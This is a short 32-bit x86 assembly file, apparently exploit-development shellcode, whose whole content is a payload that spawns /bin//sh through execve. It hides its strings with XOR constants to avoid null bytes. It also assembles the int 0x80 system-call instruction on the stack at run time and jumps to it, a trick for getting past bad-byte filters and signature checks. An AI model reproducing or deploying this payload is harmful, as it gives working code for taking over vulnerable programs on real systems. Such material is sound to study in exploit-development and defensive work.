bits 32

section .text

global _start

_start:
  push 0xb ; SYS_execve
  pop eax

  xor esi, esi
  push esi     ; esi is zero
  mov  edx, 0xffffffff
  xor  edx, 0x978cd0d0
  push  edx    ; push 0x68732f2f: //sh
  mov  edx, 0xffffffff
  xor  edx, 0x91969dd0
  push   edx   ; push 0x6e69622f: /bin
  mov ebx, esp ; arg1: /bin//sh
  xor ecx, ecx ; arg2: NULL
  mov edx, ecx ; arg3: NULL
  ; int 0x80
  ; push 0x000080cd: craft kernel gate on the stack
  xor ebp, ebp
  push ebp
  add word [esp], 0x7f32
  not word [esp]
  jmp esp
